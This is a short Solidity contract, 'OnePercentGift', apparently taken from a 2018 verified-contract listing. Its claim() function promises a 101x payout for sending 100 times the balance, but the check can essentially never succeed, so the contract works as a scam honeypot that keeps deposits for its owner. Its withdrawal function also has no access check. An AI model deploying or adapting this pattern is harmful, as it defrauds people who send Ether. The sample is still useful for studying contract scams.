
//Address: 0x094a7d5a89b4215334f2658841986ea3702ae615
//Contract name: OnePercentGift
//Balance: 0 Ether
//Verification Date: 4/9/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{

	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value * 101);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}
